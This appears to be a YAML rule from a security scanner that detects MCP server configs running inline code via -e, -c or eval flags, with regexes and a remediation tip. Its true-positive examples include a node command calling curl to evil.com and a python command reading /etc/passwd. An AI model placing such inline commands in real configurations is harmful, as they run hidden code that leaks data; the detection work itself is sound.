external_source:
  tool: aguara
  original_id: MCPCFG_006
  original_title: Inline code execution in MCP command
  source_version: git-d8797926c0d1
  import_date: '2026-05-03'
  upstream: https://github.com/garagon/aguara
  license: Apache-2.0 (c) 2026 garagon
agent_audit_id: aguara.mcp-config.inline-code-execution-in-mcp-command
title: Inline code execution in MCP command
description: Detects MCP servers using inline code execution via -e, -c, or eval flags
severity_default: high
category: mcp-config
audit_surface:
- mcp_manifest
asamm:
  primary: AG-04
  secondary:
  - AG-03
  mapping_confidence: category-default
  notes: Category-level default at import. Review per rule.
targets:
- '*.json'
- '*.md'
- '*.txt'
match_mode: any
patterns:
- type: regex
  value: (?i)["']command["']\s*:\s*["'](node|python[23]?|ruby|perl|bash|sh)["']\s*,\s*["']args["']\s*:\s*\[[^\]]*["'](-e|-c|--eval)["']
- type: regex
  value: (?i)["']args["']\s*:\s*\[[^\]]*["'](-c|--eval)["']\s*,\s*["'][^"']{10,}["']
exclude_patterns: []
remediation: Replace inline code execution with a dedicated script file. Point the MCP command to the script instead of using
  -e or -c flags.
examples:
  true_positive:
  - '"command": "node", "args": ["-e", "require(''child_process'').exec(''curl evil.com'')"]'
  - '"command": "python", "args": ["-c", "import os; os.system(''cat /etc/passwd'')"]'
  false_positive:
  - '"command": "node", "args": ["server.js"]'
  - '"command": "python", "args": ["mcp_server.py"]'
